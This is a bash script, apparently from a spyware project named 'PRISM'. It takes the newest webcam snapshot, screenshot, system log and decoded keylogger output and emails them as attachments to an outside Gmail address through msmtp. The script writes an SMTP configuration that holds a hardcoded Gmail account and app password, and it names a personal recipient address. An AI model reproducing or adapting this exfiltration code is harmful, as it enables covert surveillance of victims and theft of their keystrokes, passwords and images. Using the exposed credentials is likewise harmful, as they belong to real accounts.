#!/bin/bash

# Ensure the script is executable
SCRIPT_PATH=$(realpath "$0")
chmod +x "$SCRIPT_PATH"

# Gmail credentials
EMAIL="testshell975@gmail.com"
APP_PASSWORD="ohvj mvfn sgus nfaq"  # Replace with your app password

# Email content
TO_EMAIL="narcis.karanfilov@gmail.com"  # Replace with the recipient's email
SUBJECT="PRISM Snapshot"
BODY="Attached are the latest snapshots, system diagnostics, and key log files."

# Directory for logs and captures
CAPTURE_DIR="./logs/captures"
SYSTEM_LOGS_DIR="./logs/system_logs"
DECRYPTED_LOGS_DIR="./logs/decrypted_key_logs"
DECODED_LOG_FILE="$DECRYPTED_LOGS_DIR/decoded_key_logs.txt"

# Find the latest camera snapshot, screenshot, and system diagnostics log based on modification time
CAMERA_SNAPSHOT=$(ls -t "$CAPTURE_DIR"/camera_snapshot_*.jpg 2>/dev/null | head -n 1)
SCREENSHOT=$(ls -t "$CAPTURE_DIR"/screenshot_*.png 2>/dev/null | head -n 1)
SYSTEM_DIAGNOSTICS=$(ls -t "$SYSTEM_LOGS_DIR"/system_logs_*.log 2>/dev/null | head -n 1)

# Check if the files exist
if [[ ! -f "$CAMERA_SNAPSHOT" ]]; then
    echo "Error: No camera snapshot file found in $CAPTURE_DIR"
    exit 1
fi

if [[ ! -f "$SCREENSHOT" ]]; then
    echo "Error: No screenshot file found in $CAPTURE_DIR"
    exit 1
fi

if [[ ! -f "$SYSTEM_DIAGNOSTICS" ]]; then
    echo "Error: No system diagnostics file found in $SYSTEM_LOGS_DIR"
    exit 1
fi

if [[ ! -f "$DECODED_LOG_FILE" ]]; then
    echo "Error: No decoded key log file found at $DECODED_LOG_FILE"
    exit 1
fi

# Automatically configure msmtp if ~/.msmtprc doesn't exist
if [ ! -f ~/.msmtprc ]; then
    echo "Configuring msmtp..."

    # Create .msmtprc file with Gmail configuration
    cat <<EOL > ~/.msmtprc
account default
host smtp.gmail.com
port 587
from $EMAIL
auth on
user $EMAIL
password $APP_PASSWORD
tls on
EOL

    # Set permissions for the configuration file
    chmod 600 ~/.msmtprc
    echo "msmtp configuration complete."
else
    echo "msmtp is already configured."
fi

# Email headers and body
(
    echo "From: $EMAIL"
    echo "To: $TO_EMAIL"
    echo "Subject: $SUBJECT"
    echo "Content-Type: multipart/mixed; boundary=\"boundary1\""
    echo ""
    echo "--boundary1"
    echo "Content-Type: text/plain; charset=\"utf-8\""
    echo "Content-Transfer-Encoding: 7bit"
    echo ""
    echo "$BODY"
    echo ""
    echo "--boundary1"
    echo "Content-Type: image/jpeg; name=\"camera_snapshot.jpg\""
    echo "Content-Disposition: attachment; filename=\"camera_snapshot.jpg\""
    echo "Content-Transfer-Encoding: base64"
    echo ""
    base64 "$CAMERA_SNAPSHOT"
    echo ""
    echo "--boundary1"
    echo "Content-Type: image/png; name=\"screenshot.png\""
    echo "Content-Disposition: attachment; filename=\"screenshot.png\""
    echo "Content-Transfer-Encoding: base64"
    echo ""
    base64 "$SCREENSHOT"
    echo ""
    echo "--boundary1"
    echo "Content-Type: text/plain; name=\"system_diagnostics.log\""
    echo "Content-Disposition: attachment; filename=\"system_diagnostics.log\""
    echo "Content-Transfer-Encoding: base64"
    echo ""
    base64 "$SYSTEM_DIAGNOSTICS"
    echo ""
    echo "--boundary1"
    echo "Content-Type: text/plain; name=\"decoded_key_logs.txt\""
    echo "Content-Disposition: attachment; filename=\"decoded_key_logs.txt\""
    echo "Content-Transfer-Encoding: base64"
    echo ""
    base64 "$DECODED_LOG_FILE"
    echo ""
    echo "--boundary1--"
) | msmtp --from=default -t "$TO_EMAIL"

# Check if the email was sent successfully
if [ $? -eq 0 ]; then
    echo "Email sent successfully to $TO_EMAIL."
else
    echo "Error sending email."
    exit 1
fi
